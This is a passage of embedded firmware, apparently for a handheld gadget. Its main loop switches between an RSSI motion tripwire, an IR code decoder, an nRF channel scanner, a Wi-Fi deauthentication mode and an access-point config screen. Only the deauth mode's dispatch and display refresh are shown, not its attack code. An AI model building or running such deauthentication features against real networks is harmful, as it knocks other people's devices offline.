        int yVal = 42 - (int)(((float)currentRssi - baselineRSSI) * 3.5);
        yVal = constrain(yVal, 22, 62);

        waveBuffer[waveIndex] = yVal;
        waveIndex = (waveIndex + 1) % WAVE_POINTS;

        if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive) {
          drawTripwireUI(delta, currentRssi, isMotionActive);
        }
      }
      break;
    }

    case MODE_IR_DECODER: {
      if (irrecv.decode(&irResults)) {
        bool isValidSignal = (irResults.decode_type != decode_type_t::UNKNOWN) &&
                             (irResults.bits >= 8) &&
                             (irResults.value != 0);

        if (isValidSignal) {
          lastProtocol = typeToString(irResults.decode_type);
          lastHexCode  = "0x" + uint64ToString(irResults.value, HEX);
          lastBits     = irResults.bits;

          triggerLedAlert();

          if (isDeviceLocked) {
            setEmotion(EMO_WINK);
          } else {
            lastUserActivity = currentMillis;
            if (isClockModeActive) {
              isClockModeActive = false;
              setOledBrightness(userBrightness);
              display.clearDisplay();
            }
          }
        }
        irrecv.resume();
      }

      if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 100)) {
        lastDisplayDraw = currentMillis;
        drawDecoderUI();
      }
      break;
    }

    case MODE_NRF_SCANNER: {
      scanNrfChannels();

      if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 40)) {
        lastDisplayDraw = currentMillis;
        drawNrfScannerUI();
      }
      break;
    }

    case MODE_DEAUTH: {
      updateDeauth();

      if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 200)) {
        lastDisplayDraw = currentMillis;
        drawDeauthUI();
      }
      break;
    }

    case MODE_AP_CONFIG: {
      server.handleClient();

      if (currentMillis - lastDisplayDraw >= 300) {
        lastDisplayDraw = currentMillis;
        drawConfigUI();
      }
      break;
    }
  }
}    